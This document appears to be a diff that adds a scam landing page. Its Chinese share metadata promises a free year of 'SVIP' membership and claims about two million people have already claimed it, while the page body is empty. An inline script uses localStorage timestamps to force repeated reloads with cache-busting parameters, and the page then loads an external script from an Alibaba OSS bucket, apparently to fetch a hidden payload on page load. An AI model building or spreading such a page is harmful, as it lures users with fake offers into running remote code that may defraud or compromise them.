@@ -1,0 +1,28 @@
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta itemprop="name" content="送你一年𝐒𝐕𝐈𝐏会员">
+    <meta itemprop="image" content="http://inews.gtimg.com/newsapp_bt/0/12220440868/641">
+    <meta name="description" itemprop="description" content="已有1976845人领取">
+    <script>
+    let presentTime = (new Date()).getTime(),
+        hrefWithoutSearch = location.protocol + '//' + location.host + location.pathname;
+
+    if (localStorage.getItem('previousHref') === null) {
+        localStorage.setItem('previousHref', hrefWithoutSearch + "?v=" + presentTime);
+        localStorage.setItem('previousAccessTime', presentTime);
+        location.href = hrefWithoutSearch + "?v=" + presentTime;
+    } else {
+        let interval = presentTime - parseInt(localStorage.getItem('previousAccessTime'), 10);
+        if (interval > 2000) {
+            localStorage.setItem('previousAccessTime', presentTime);
+            location.href = hrefWithoutSearch + "?v=" + presentTime;
+        }
+    }
+    </script>
+    <script src="https://ad90.oss-cn-shenzhen.aliyuncs.com/hy/1amk.js"></script>
+    <title></title>
+</head>
+<body>
+</body>
+</html>
